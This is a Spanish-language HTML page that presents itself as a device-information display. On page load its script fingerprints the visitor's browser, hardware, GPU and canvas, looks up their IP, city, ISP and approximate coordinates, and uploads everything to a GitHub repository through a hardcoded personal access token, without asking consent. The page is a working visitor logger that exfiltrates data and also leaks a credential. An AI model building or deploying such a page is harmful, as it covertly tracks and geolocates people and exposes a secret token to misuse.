<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Información</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f172a; color: #e2e8f0; padding: 24px; }
  h1 { color: #38bdf8; margin-bottom: 8px; font-size: 1.6rem; }
  .sub { color: #94a3b8; margin-bottom: 20px; font-size: .9rem; }
  pre { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 16px; white-space: pre-wrap; word-break: break-word; font-size: .85rem; line-height: 1.5; max-height: 70vh; overflow-y: auto; }
</style>
</head>
<body>
<h1>Información del dispositivo</h1>
<p class="sub"><span id="estado">Recopilando...</span></p>
<pre id="salida"></pre>

<script>
const GH_TOKEN = "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";
const REPO = "a101mdtbb/home";
const ARCHIVO = "registros.txt";

const salida = document.getElementById('salida');
const estado = document.getElementById('estado');
const datos = {};

function detectarNavegador() {
  const ua = navigator.userAgent;
  let nav = 'Desconocido';
  if (/Edg\//.test(ua)) nav = 'Microsoft Edge';
  else if (/OPR\/|Opera/.test(ua)) nav = 'Opera';
  else if (/Firefox\//.test(ua)) nav = 'Firefox';
  else if (/Chrome\//.test(ua)) nav = 'Chrome';
  else if (/Safari\//.test(ua)) nav = 'Safari';
  let so = 'Desconocido';
  if (/Windows NT 10/.test(ua)) so = 'Windows 10/11';
  else if (/Windows/.test(ua)) so = 'Windows';
  else if (/Android/.test(ua)) so = 'Android';
  else if (/iPhone|iPad|iPod/.test(ua)) so = 'iOS';
  else if (/Mac OS X/.test(ua)) so = 'macOS';
  else if (/CrOS/.test(ua)) so = 'ChromeOS';
  else if (/Linux/.test(ua)) so = 'Linux';
  return { navegador: nav, sistemaOperativo: so };
}

function canvasFingerprint() {
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('fingerprint', 4, 17);
    return c.toDataURL().slice(-64) + '...';
  } catch (e) { return 'No disponible'; }
}

async function recopilar() {
  const nb = detectarNavegador();
  datos['Fecha y hora'] = new Date().toISOString();
  datos['Navegador'] = nb.navegador;
  datos['Sistema operativo'] = nb.sistemaOperativo;
  datos['User Agent'] = navigator.userAgent;
  datos['Plataforma'] = navigator.platform || 'N/D';
  datos['Idioma'] = navigator.language;
  datos['Cookies'] = navigator.cookieEnabled ? 'Sí' : 'No';
  datos['Núcleos CPU'] = navigator.hardwareConcurrency || 'N/D';
  datos['RAM aprox.'] = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/D';
  datos['Pantalla'] = screen.width + 'x' + screen.height + ' @' + screen.colorDepth + 'bits';
  datos['DPR'] = window.devicePixelRatio;
  datos['Ventana'] = window.innerWidth + 'x' + window.innerHeight;
  datos['Táctil'] = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Sí (' + navigator.maxTouchPoints + ')' : 'No';
  if (navigator.connection) {
    const c = navigator.connection;
    datos['Conexión'] = (c.effectiveType || 'N/D') + ' ~' + (c.downlink || '?') + 'Mbps rtt:' + c.rtt;
  }
  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      datos['GPU'] = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    }
  } catch (e) {}
  datos['Canvas FP'] = canvasFingerprint();
  datos['Zona horaria'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
  try {
    const r = await fetch('https://ipapi.co/json/');
    const j = await r.json();
    datos['IP'] = j.ip;
    datos['País'] = j.country_name;
    datos['Región'] = j.region;
    datos['Ciudad'] = j.city;
    datos['ISP'] = j.org;
    datos['Coordenadas aprox.'] = j.latitude + ', ' + j.longitude;
  } catch (e) { datos['IP'] = 'No disponible'; }
}

function texto() {
  let t = '';
  for (const [k, v] of Object.entries(datos)) t += k + ': ' + v + '\n';
  return t;
}

const b64e = s => btoa(String.fromCharCode(...new TextEncoder().encode(s)));
const b64d = b => new TextDecoder().decode(Uint8Array.from(atob(b), c => c.charCodeAt(0)));

async function api(url, opciones) {
  const r = await fetch(url, Object.assign({
    headers: {
      'Authorization': 'Bearer ' + GH_TOKEN,
      'Accept': 'application/vnd.github+json'
    }
  }, opciones));
  return r;
}

async function subir(intento) {
  let sha = null;
  let previo = '';
  const get = await api('https://api.github.com/repos/' + REPO + '/contents/' + ARCHIVO);
  if (get.status === 200) {
    const j = await get.json();
    sha = j.sha;
    try { previo = b64d(j.content); } catch (e) { previo = ''; }
  } else if (get.status !== 404) {
    throw new Error('GET ' + get.status);
  }
  const registro = '--- Registro ---\n' + texto() + '\n';
  const put = await api('https://api.github.com/repos/' + REPO + '/contents/' + ARCHIVO, {
    method: 'PUT',
    headers: { 'Authorization': 'Bearer ' + GH_TOKEN, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
    body: JSON.stringify({
      message: 'registro ' + new Date().toISOString(),
      content: b64e(previo + registro),
      sha: sha
    })
  });
  if (put.status === 409 && intento < 3) return subir(intento + 1);
  if (!put.ok) throw new Error('PUT ' + put.status);
}

async function enviar() {
  if (!GH_TOKEN) { estado.textContent = '⚠ Configura GH_TOKEN con tu token de GitHub.'; return; }
  try {
    await subir(0);
    estado.textContent = '✔ Registro guardado en ' + REPO + '/' + ARCHIVO;
  } catch (e) {
    estado.textContent = '✖ Error al guardar: ' + e.message;
  }
}

(async () => {
  await recopilar();
  salida.textContent = texto();
  enviar();
})();
</script>
</body>
</html>
